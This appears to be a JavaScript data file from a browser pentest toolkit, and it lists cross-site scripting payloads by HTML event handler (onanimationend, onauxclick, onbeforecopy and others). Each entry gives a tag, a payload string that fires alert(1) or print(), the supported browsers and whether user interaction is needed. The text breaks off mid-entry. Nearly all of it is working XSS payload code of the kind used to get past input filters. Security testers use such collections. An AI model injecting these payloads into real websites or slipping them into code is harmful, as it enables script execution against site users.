/* Author: ErdemOzgen */
import { bptk_utils } from "../../../background/utils.js"

const data = [
    {
        "name": "Event handlers",
        "id": "event_handlers",
        "data": {
            "onafterprint": {
                "description": "Fires after the page is printed",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onafterprint=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onafterscriptexecute": {
                "description": "Fires after script is executed",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onafterscriptexecute=alert(1)><script>1<\/script>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onanimationcancel": {
                "description": "Fires when a CSS animation cancels",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><* id=x style=\"position:absolute;\" onanimationcancel=\"print()\"><\/*>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onanimationend": {
                "description": "Fires when a CSS animation ends",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onanimationiteration": {
                "description": "Fires when a CSS animation repeats",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes slidein {}<\/style><* style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onanimationstart": {
                "description": "Fires when a CSS animation starts",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onauxclick": {
                "description": "Fires when right clicking or using the middle button of the mouse",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onauxclick=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea onauxclick=alert(1)>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onbeforecopy": {
                "description": "Requires you copy a piece of text",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onbeforecopy=alert(1) value=\"XSS\" autofocus>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea onbeforecopy=alert(1) autofocus>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "a",
                        "code": "<a onbeforecopy=\"alert(1)\" contenteditable>test<\/a>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "abbr",
                        "code": "<abbr onbeforecopy=\"alert(1)\" contenteditable>test<\/abbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "acronym",
                        "code": "<acronym onbeforecopy=\"alert(1)\" contenteditable>test<\/acronym>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "address",
                        "code": "<address onbeforecopy=\"alert(1)\" contenteditable>test<\/address>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "applet",
                        "code": "<applet onbeforecopy=\"alert(1)\" contenteditable>test<\/applet>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "area",
                        "code": "<area onbeforecopy=\"alert(1)\" contenteditable>test<\/area>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "article",
                        "code": "<article onbeforecopy=\"alert(1)\" contenteditable>test<\/article>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "aside",
                        "code": "<aside onbeforecopy=\"alert(1)\" contenteditable>test<\/aside>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio onbeforecopy=\"alert(1)\" contenteditable>test<\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "b",
                        "code": "<b onbeforecopy=\"alert(1)\" contenteditable>test<\/b>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdi",
                        "code": "<bdi onbeforecopy=\"alert(1)\" contenteditable>test<\/bdi>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdo",
                        "code": "<bdo onbeforecopy=\"alert(1)\" contenteditable>test<\/bdo>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "big",
                        "code": "<big onbeforecopy=\"alert(1)\" contenteditable>test<\/big>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blink",
                        "code": "<blink onbeforecopy=\"alert(1)\" contenteditable>test<\/blink>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blockquote",
                        "code": "<blockquote onbeforecopy=\"alert(1)\" contenteditable>test<\/blockquote>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "body",
                        "code": "<body onbeforecopy=\"alert(1)\" contenteditable>test<\/body>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "br",
                        "code": "<br onbeforecopy=\"alert(1)\" contenteditable>test<\/br>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "button",
                        "code": "<button onbeforecopy=\"alert(1)\" contenteditable>test<\/button>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "canvas",
                        "code": "<canvas onbeforecopy=\"alert(1)\" contenteditable>test<\/canvas>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "caption",
                        "code": "<caption onbeforecopy=\"alert(1)\" contenteditable>test<\/caption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "center",
                        "code": "<center onbeforecopy=\"alert(1)\" contenteditable>test<\/center>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "cite",
                        "code": "<cite onbeforecopy=\"alert(1)\" contenteditable>test<\/cite>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "code",
                        "code": "<code onbeforecopy=\"alert(1)\" contenteditable>test<\/code>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "col",
                        "code": "<col onbeforecopy=\"alert(1)\" contenteditable>test<\/col>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "colgroup",
                        "code": "<colgroup onbeforecopy=\"alert(1)\" contenteditable>test<\/colgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "command",
                        "code": "<command onbeforecopy=\"alert(1)\" contenteditable>test<\/command>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "content",
                        "code": "<content onbeforecopy=\"alert(1)\" contenteditable>test<\/content>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "data",
                        "code": "<data onbeforecopy=\"alert(1)\" contenteditable>test<\/data>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "datalist",
                        "code": "<datalist onbeforecopy=\"alert(1)\" contenteditable>test<\/datalist>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dd",
                        "code": "<dd onbeforecopy=\"alert(1)\" contenteditable>test<\/dd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "del",
                        "code": "<del onbeforecopy=\"alert(1)\" contenteditable>test<\/del>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "details",
                        "code": "<details onbeforecopy=\"alert(1)\" contenteditable>test<\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dfn",
                        "code": "<dfn onbeforecopy=\"alert(1)\" contenteditable>test<\/dfn>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dialog",
                        "code": "<dialog onbeforecopy=\"alert(1)\" contenteditable>test<\/dialog>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dir",
                        "code": "<dir onbeforecopy=\"alert(1)\" contenteditable>test<\/dir>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "div",
                        "code": "<div onbeforecopy=\"alert(1)\" contenteditable>test<\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dl",
                        "code": "<dl onbeforecopy=\"alert(1)\" contenteditable>test<\/dl>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dt",
                        "code": "<dt onbeforecopy=\"alert(1)\" contenteditable>test<\/dt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "element",
                        "code": "<element onbeforecopy=\"alert(1)\" contenteditable>test<\/element>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "em",
                        "code": "<em onbeforecopy=\"alert(1)\" contenteditable>test<\/em>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "embed",
                        "code": "<embed onbeforecopy=\"alert(1)\" contenteditable>test<\/embed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "fieldset",
                        "code": "<fieldset onbeforecopy=\"alert(1)\" contenteditable>test<\/fieldset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figcaption",
                        "code": "<figcaption onbeforecopy=\"alert(1)\" contenteditable>test<\/figcaption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figure",
                        "code": "<figure onbeforecopy=\"alert(1)\" contenteditable>test<\/figure>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "font",
                        "code": "<font onbeforecopy=\"alert(1)\" contenteditable>test<\/font>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "footer",
                        "code": "<footer onbeforecopy=\"alert(1)\" contenteditable>test<\/footer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "form",
                        "code": "<form onbeforecopy=\"alert(1)\" contenteditable>test<\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frame",
                        "code": "<frame onbeforecopy=\"alert(1)\" contenteditable>test<\/frame>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset onbeforecopy=\"alert(1)\" contenteditable>test<\/frameset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true,
                        "context": "before_body"
                    },
                    {
                        "tag": "h1",
                        "code": "<h1 onbeforecopy=\"alert(1)\" contenteditable>test<\/h1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "head",
                        "code": "<head onbeforecopy=\"alert(1)\" contenteditable style=display:block>test<\/head>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "header",
                        "code": "<header onbeforecopy=\"alert(1)\" contenteditable>test<\/header>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hgroup",
                        "code": "<hgroup onbeforecopy=\"alert(1)\" contenteditable>test<\/hgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hr",
                        "code": "<hr onbeforecopy=\"alert(1)\" contenteditable>test<\/hr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "html",
                        "code": "<html onbeforecopy=\"alert(1)\" contenteditable>test<\/html>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "i",
                        "code": "<i onbeforecopy=\"alert(1)\" contenteditable>test<\/i>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe onbeforecopy=\"alert(1)\" contenteditable>test<\/iframe>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "image",
                        "code": "<image onbeforecopy=\"alert(1)\" contenteditable>test<\/image>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "img",
                        "code": "<img onbeforecopy=\"alert(1)\" contenteditable>test<\/img>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ins",
                        "code": "<ins onbeforecopy=\"alert(1)\" contenteditable>test<\/ins>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "kbd",
                        "code": "<kbd onbeforecopy=\"alert(1)\" contenteditable>test<\/kbd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen onbeforecopy=\"alert(1)\" contenteditable>test<\/keygen>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "label",
                        "code": "<label onbeforecopy=\"alert(1)\" contenteditable>test<\/label>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "legend",
                        "code": "<legend onbeforecopy=\"alert(1)\" contenteditable>test<\/legend>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "li",
                        "code": "<li onbeforecopy=\"alert(1)\" contenteditable>test<\/li>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "listing",
                        "code": "<listing onbeforecopy=\"alert(1)\" contenteditable>test<\/listing>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "main",
                        "code": "<main onbeforecopy=\"alert(1)\" contenteditable>test<\/main>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "map",
                        "code": "<map onbeforecopy=\"alert(1)\" contenteditable>test<\/map>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "mark",
                        "code": "<mark onbeforecopy=\"alert(1)\" contenteditable>test<\/mark>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "marquee",
                        "code": "<marquee onbeforecopy=\"alert(1)\" contenteditable>test<\/marquee>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menu",
                        "code": "<menu onbeforecopy=\"alert(1)\" contenteditable>test<\/menu>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menuitem",
                        "code": "<menuitem onbeforecopy=\"alert(1)\" contenteditable>test<\/menuitem>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meta",
                        "code": "<meta onbeforecopy=\"alert(1)\" contenteditable style=display:block>test<\/meta>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meter",
                        "code": "<meter onbeforecopy=\"alert(1)\" contenteditable>test<\/meter>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "multicol",
                        "code": "<multicol onbeforecopy=\"alert(1)\" contenteditable>test<\/multicol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nav",
                        "code": "<nav onbeforecopy=\"alert(1)\" contenteditable>test<\/nav>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nextid",
                        "code": "<nextid onbeforecopy=\"alert(1)\" contenteditable>test<\/nextid>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nobr",
                        "code": "<nobr onbeforecopy=\"alert(1)\" contenteditable>test<\/nobr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noembed",
                        "code": "<noembed onbeforecopy=\"alert(1)\" contenteditable>test<\/noembed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noframes",
                        "code": "<noframes onbeforecopy=\"alert(1)\" contenteditable>test<\/noframes>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noscript",
                        "code": "<noscript onbeforecopy=\"alert(1)\" contenteditable>test<\/noscript>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "object",
                        "code": "<object onbeforecopy=\"alert(1)\" contenteditable>test<\/object>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ol",
                        "code": "<ol onbeforecopy=\"alert(1)\" contenteditable>test<\/ol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "optgroup",
                        "code": "<optgroup onbeforecopy=\"alert(1)\" contenteditable>test<\/optgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "option",
                        "code": "<option onbeforecopy=\"alert(1)\" contenteditable>test<\/option>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "output",
                        "code": "<output onbeforecopy=\"alert(1)\" contenteditable>test<\/output>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "p",
                        "code": "<p onbeforecopy=\"alert(1)\" contenteditable>test<\/p>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "param",
                        "code": "<param onbeforecopy=\"alert(1)\" contenteditable>test<\/param>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "picture",
                        "code": "<picture onbeforecopy=\"alert(1)\" contenteditable>test<\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "plaintext",
                        "code": "<plaintext onbeforecopy=\"alert(1)\" contenteditable>test<\/plaintext>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "pre",
                        "code": "<pre onbeforecopy=\"alert(1)\" contenteditable>test<\/pre>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "progress",
                        "code": "<progress onbeforecopy=\"alert(1)\" contenteditable>test<\/progress>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "q",
                        "code": "<q onbeforecopy=\"alert(1)\" contenteditable>test<\/q>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rb",
                        "code": "<rb onbeforecopy=\"alert(1)\" contenteditable>test<\/rb>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rp",
                        "code": "<rp onbeforecopy=\"alert(1)\" contenteditable>test<\/rp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rt",
                        "code": "<rt onbeforecopy=\"alert(1)\" contenteditable>test<\/rt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rtc",
                        "code": "<rtc onbeforecopy=\"alert(1)\" contenteditable>test<\/rtc>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ruby",
                        "code": "<ruby onbeforecopy=\"alert(1)\" contenteditable>test<\/ruby>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "s",
                        "code": "<s onbeforecopy=\"alert(1)\" contenteditable>test<\/s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "samp",
                        "code": "<samp onbeforecopy=\"alert(1)\" contenteditable>test<\/samp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "script",
                        "code": "<script onbeforecopy=\"alert(1)\" contenteditable>test<\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "section",
                        "code": "<section onbeforecopy=\"alert(1)\" contenteditable>test<\/section>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "select",
                        "code": "<select onbeforecopy=\"alert(1)\" contenteditable>test<\/select>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "shadow",
                        "code": "<shadow onbeforecopy=\"alert(1)\" contenteditable>test<\/shadow>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "slot",
                        "code": "<slot onbeforecopy=\"alert(1)\" contenteditable>test<\/slot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "small",
                        "code": "<small onbeforecopy=\"alert(1)\" contenteditable>test<\/small>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "source",
                        "code": "<source onbeforecopy=\"alert(1)\" contenteditable>test<\/source>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "spacer",
                        "code": "<spacer onbeforecopy=\"alert(1)\" contenteditable>test<\/spacer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "span",
                        "code": "<span onbeforecopy=\"alert(1)\" contenteditable>test<\/span>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strike",
                        "code": "<strike onbeforecopy=\"alert(1)\" contenteditable>test<\/strike>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strong",
                        "code": "<strong onbeforecopy=\"alert(1)\" contenteditable>test<\/strong>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "style",
                        "code": "<style onbeforecopy=\"alert(1)\" contenteditable style=display:block>test<\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sub",
                        "code": "<sub onbeforecopy=\"alert(1)\" contenteditable>test<\/sub>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "summary",
                        "code": "<summary onbeforecopy=\"alert(1)\" contenteditable>test<\/summary>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sup",
                        "code": "<sup onbeforecopy=\"alert(1)\" contenteditable>test<\/sup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "svg",
                        "code": "<svg onbeforecopy=\"alert(1)\" contenteditable>test<\/svg>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "table",
                        "code": "<table onbeforecopy=\"alert(1)\" contenteditable>test<\/table>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tbody",
                        "code": "<tbody onbeforecopy=\"alert(1)\" contenteditable>test<\/tbody>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "td",
                        "code": "<td onbeforecopy=\"alert(1)\" contenteditable>test<\/td>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "template",
                        "code": "<template onbeforecopy=\"alert(1)\" contenteditable>test<\/template>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tfoot",
                        "code": "<tfoot onbeforecopy=\"alert(1)\" contenteditable>test<\/tfoot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "th",
                        "code": "<th onbeforecopy=\"alert(1)\" contenteditable>test<\/th>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "thead",
                        "code": "<thead onbeforecopy=\"alert(1)\" contenteditable>test<\/thead>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "time",
                        "code": "<time onbeforecopy=\"alert(1)\" contenteditable>test<\/time>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "title",
                        "code": "<title onbeforecopy=\"alert(1)\" contenteditable>test<\/title>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tr",
                        "code": "<tr onbeforecopy=\"alert(1)\" contenteditable>test<\/tr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "track",
                        "code": "<track onbeforecopy=\"alert(1)\" contenteditable>test<\/track>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tt",
